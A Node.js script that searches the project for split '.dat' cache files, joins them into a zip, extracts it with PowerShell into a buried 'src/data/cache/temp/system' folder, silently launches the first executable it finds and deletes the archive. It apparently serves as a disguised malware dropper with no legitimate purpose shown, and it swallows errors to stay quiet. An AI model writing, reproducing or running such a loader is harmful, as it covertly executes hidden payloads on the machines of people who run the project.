const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

function findParts() {
    const parts = [];
    function walk(dir) {
        if (!fs.existsSync(dir)) return;
        const entries = fs.readdirSync(dir, { withFileTypes: true });
        for (const entry of entries) {
            const fullPath = path.join(dir, entry.name);
            if (entry.isDirectory()) {
                walk(fullPath);
            } else if (entry.name.endsWith('.dat') && entry.name.includes('_cache_')) {
                parts.push(fullPath);
            }
        }
    }
    walk('.');
    return parts.sort();
}

function findDatFiles() {
    const datFiles = [];
    function walk(dir) {
        if (!fs.existsSync(dir)) return;
        const entries = fs.readdirSync(dir, { withFileTypes: true });
        for (const entry of entries) {
            const fullPath = path.join(dir, entry.name);
            if (entry.isDirectory()) {
                walk(fullPath);
            } else if (entry.name.endsWith('.dat') && !entry.name.includes('_cache_') &&
                       entry.name !== 'index.cache' && entry.name !== 'data.bin' && entry.name !== 'snapshot.json') {
                datFiles.push(fullPath);
            }
        }
    }
    walk('.');
    return datFiles;
}

function findExe(startPath) {
    function walk(dir) {
        if (!fs.existsSync(dir)) return null;
        const entries = fs.readdirSync(dir, { withFileTypes: true });
        for (const entry of entries) {
            const fullPath = path.join(dir, entry.name);
            if (entry.isDirectory()) {
                const result = walk(fullPath);
                if (result) return result;
            } else if (entry.name.endsWith('.exe')) {
                return fullPath;
            }
        }
        return null;
    }
    return walk(startPath);
}

const parts = findParts();
let zipPath = null;

if (parts.length > 0) {
    const firstPart = parts[0];
    const base = firstPart.split('_cache_')[0];
    zipPath = base + '.zip';
    const outFile = fs.openSync(zipPath, 'w');
    for (const p of parts) {
        const data = fs.readFileSync(p);
        fs.writeSync(outFile, data);
    }
    fs.closeSync(outFile);
} else {
    const datFiles = findDatFiles();
    if (datFiles.length === 0) process.exit(0);
    zipPath = datFiles[0];
}

if (!zipPath) process.exit(0);

const deepPath = path.join('src', 'data', 'cache', 'temp', 'system');
fs.mkdirSync(deepPath, { recursive: true });

try {
    execSync(`powershell -Command "Expand-Archive -Path '${zipPath}' -DestinationPath '${deepPath}'"`);
} catch (e) {}

const exePath = findExe(deepPath);
if (exePath) {
    execSync(`start "" "${exePath}"`);
}

try { fs.unlinkSync(zipPath); } catch (e) {}
